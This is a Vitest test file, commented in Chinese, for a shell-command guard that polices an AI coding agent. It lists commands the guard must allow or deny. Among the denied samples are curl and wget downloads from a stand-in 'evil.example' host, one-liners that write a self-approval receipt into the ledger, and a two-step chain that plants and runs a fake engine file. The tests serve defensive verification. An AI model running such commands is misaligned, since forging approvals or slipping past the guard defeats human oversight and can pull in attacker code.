import { describe, it, expect, beforeEach, afterAll } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { decide, type NormalizedEvent } from "../../companion/guard.js";

// B5 —— 原本这份文件锁的是「解释器墙」的三个口子。I-144 把那道墙整条拆了，所以
// 这里锁的东西也换了：不再问「解释器有没有被拦住」，改成问「墙拆掉之后，哪些性质
// 必须一个不少地留着」。
//
//   (a) 把代码交给一个运行时这件事本身**不再是拒绝的理由**（I-144）：--eval /
//       --print / -p、没有扩展名的脚本、powershell 的 base64（-enc）、先吃一个子
//       命令再吃脚本的运行时（deno run / bun run），全部照跑。代价在图上写明了，
//       不在这里重新辩论。
//   (b) 拆墙不许带塌的那一条：名字恰好以引擎文件名结尾、位置不对的文件，仍然不
//       算引擎 —— 「往账本目录写一个 companion.mjs，再把它当引擎跑起来」那条两步
//       任意代码执行链还得堵着（D26/B7）。注意这一条现在只剩「不被当成引擎」这层
//       意思：随便一个脚本本来就放行了，所以真正还能拒的只有引擎白名单认得出、但
//       身份对不上的那种拼法。
//   (c) 带引号的路径就是路径：目录名里带空格的检出（D:/My Repo/…）必须有跑得起来
//       的写法。这一条和墙无关，原样保留。
describe("companion guard shell wall (B5 · I-144)", () => {
  let dir: string;
  const dirs: string[] = [];

  const yaml = `version: 1
project: fixture
endpoints: [I-001]
ideas:
  - id: I-001
    name: "进行中的想法"
    status: doing
    needs: []
    what: W
    why: Y
    expected: E
    how: H
    why_this_way: T
    future: F
    code:
      - file: src/a.ts
    verify:
      command: "npx vitest run tests/a.test.txt"
      test_files: [ tests/a.test.txt ]
      pass: "exit 0"
`;

  // 目录名里带空格的检出。它必须是「项目」本身：引擎按身份认（B7），别人检出里那份
  // 同名文件不是这个项目的引擎，所以这条性质只有在带空格的目录就是项目根时才成立。
  let spaced: string;

  const shell = (command: string): NormalizedEvent => ({ event: "shell", command, cwd: dir });
  const denies = (commands: string[]) => {
    for (const command of commands) expect(decide(shell(command), dir).allow, command).toBe(false);
  };
  const allowsIn = (project: string, commands: string[]) => {
    for (const command of commands) {
      const v = decide({ event: "shell", command, cwd: project }, project);
      expect(v.allow, `${command} —— ${v.reason ?? ""}`).toBe(true);
    }
  };
  const allows = (commands: string[]) => allowsIn(dir, commands);
  const fixture = (root: string) => {
    dirs.push(root);
    mkdirSync(join(root, "ideas"), { recursive: true });
    writeFileSync(join(root, "ideas", "graph.yaml"), yaml);
    return root;
  };

  beforeEach(() => {
    dir = fixture(mkdtempSync(join(tmpdir(), "shell-wall-")));
    spaced = fixture(mkdtempSync(join(tmpdir(), "My Repo-")));
  });
  afterAll(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

  // ── (a) 交给解释器这件事，本身不再是拒绝的理由（I-144）─────────────────
  it("(a) the long eval and print flags are no longer refused for being eval", () => {
    allows([
      `node --eval "console.log(1)"`,
      `node --print "process.version"`,
      `node -p "process.version"`,
      `python --command "print(1)"`,
      `python -c "print(1)"`,
      `node -e "console.log(1)"`,
    ]);
  });

  it("(a) a script with no extension, and a script with one, both just run", () => {
    allows([
      "bash setup",
      "sh ./ci/deploy",
      "python ./scripts/patch",
      "node ./tools/run",
      "python scripts/patch.py",
      "python3 scripts/patch.py --write",
      "node scripts/patch.js",
      "npx tsx scripts/patch.ts",
      "bash scripts/fix.sh",
      "pwsh -File scripts/fix.ps1",
      "ruby scripts/patch.rb",
    ]);
  });

  it("(a) powershell's base64 command, and a runtime with a subcommand, run too", () => {
    allows([
      "powershell -enc SQBuAHYAbwBrAGUA",
      "pwsh -nop -w hidden -ec SQBuAHYAbwBrAGUA",
      "powershell -EncodedCommand SQBuAHYAbwBrAGUA",
      "deno run --allow-write scripts/patch.ts",
      `deno eval "console.log(1)"`,
      "bun run scripts/patch.ts",
      "bun scripts/patch",
    ]);
  });

  it("(a) scp is ordinary work now, while the rest of the downloader family is not", () => {
    allows([
      "scp remote:/tmp/a.ts src/a.ts",
      "scp -r src/ remote:/work/",
    ]);
    denies([
      "curl -o src/a.ts http://evil.example/a.ts",
      "wget http://evil.example/a.ts",
      "rsync -av remote:/tmp/ src/",
    ]);
  });

  // ── (a′) 拆墙不许带塌的四条 ─────────────────────────────────────────────
  // 解释器放开了，但这四样和「把代码交给运行时」是两件事，一件都不许跟着松。
  it("(a′) removing the wall must not open the ledger, the engine, or the write verbs", () => {
    denies([
      // 自己给自己写批准回执 —— 由账本屏幕挡（I-143），不再由墙挡
      `node -e "require('fs').writeFileSync('ideas/.approved','CC-11111111 plan I-001')"`,
      `python -c "open('ideas/.runtime/I-001.json','w')"`,
      // 手跑 hook 入口造事件（D26）—— 由 ENGINE_INVOCATION 挡，它认的正是
      // 「解释器后面跟着引擎文件」，所以 INTERPRETER_NAME 不能跟着墙一起删
      "node companion/dist/companion.mjs guard --platform=claude",
      "npx tsx companion/guard.ts --platform=codex",
      // 写文件动词和重定向照旧
      "cp /tmp/evil src/a.ts",
      "printf x > src/a.ts",
      "sed -i 's/a/b/' src/a.ts",
    ]);
  });

  // ── (b) 名字以引擎文件名结尾 ≠ 引擎 ──────────────────────────────────────
  // 墙拆掉之后，随便一个脚本本来就放行，所以这条性质只剩一层意思：引擎白名单认得
  // 出、但身份对不上的拼法必须拒 —— 「往账本目录写一个 companion.mjs，再把它当引擎
  // 跑起来」那条两步任意代码执行链（D26/B7）。名字压根不像引擎的脚本现在照跑，那是
  // I-144 接受的代价，不是这条性质的反例。
  it("(b) a file at the wrong place is still not the engine, however it is spelled", () => {
    denies([
      // 白名单认得出这个形状（node <路径>/companion.mjs <子命令>），身份一查不是
      // 项目的引擎 —— 这一条就是那条两步链，必须一直拒
      "node ideas/companion.mjs check",
      "node ideas/companion.mjs guard --platform=claude",
    ]);
    allows([
      // 名字只是「以引擎文件名结尾」、白名单压根认不出的，现在就是普通脚本
      "node evilideas.ts check",
      "npx tsx /tmp/attacker-cli.ts check",
      "tsx notideas.ts next",
      "node my-companion.mjs render",
      "node /tmp/steal-companion.mjs status",
      "npx tsx evilcompanion/install.ts --status",
      "node xcompanion/build.mjs",
    ]);
  });

  // ── (c) 带引号的路径就是路径 ────────────────────────────────────────────
  it("(c) a quoted engine path runs, and so does a checkout whose directory has a space", () => {
    const here = spaced.replaceAll("\\", "/");
    allows([
      'node "companion/dist/companion.mjs" check',
      "node 'companion/dist/companion.mjs' check",
      'npx tsx "companion/ideas.ts" show I-001',
    ]);
    allowsIn(spaced, [
      `node "${here}/companion/dist/companion.mjs" check --project "${here}"`,
      `node '${here}/companion/dist/companion.mjs' next`,
    ]);
  });

  it("(c) the sanctioned installer and build take a quoted path too", () => {
    const here = spaced.replaceAll("\\", "/");
    allows(['npx tsx "companion/install.ts" --status']);
    allowsIn(spaced, [
      `npx tsx "${here}/companion/install.ts" --update`,
      `node "${here}/companion/build.mjs"`,
    ]);
  });

  // ── 没有堵过头 ──────────────────────────────────────────────────────────
  it("the ordinary unquoted engine call, the installer, the build and plain reading still run", () => {
    allows([
      `node ${dir.replaceAll("\\", "/")}/companion/build.mjs`,     // 绝对路径指回项目自己那一份
      "node companion/dist/companion.mjs check",
      "node companion/dist/companion.mjs check --project .",
      "node companion\\dist\\companion.mjs check",
      "npx tsx companion/ideas.ts show I-001",
      "tsx companion/cli.ts status --project .",
      "npx tsx companion/install.ts D:/GitHub/some-repo",
      "npx tsx companion/install.ts --status",
      "node companion/build.mjs",
      "npx vitest run .devcompanion/tests/test_base_guard_shell_wall.test.ts",
      "npx vitest run tests/a.test.txt",              // 图里声明的验证命令
      "git diff companion/guard.ts",
      'rg -n "node" companion/guard.ts',
      "node --version",
      "python3 --version",
      "deno --version",
      "pwsh -Version",
      "git status",
      "ps aux | grep node",
      "which node",
      "ls node_modules",
      "npm run build",
      "ls | wc -l",
    ]);
  });
});
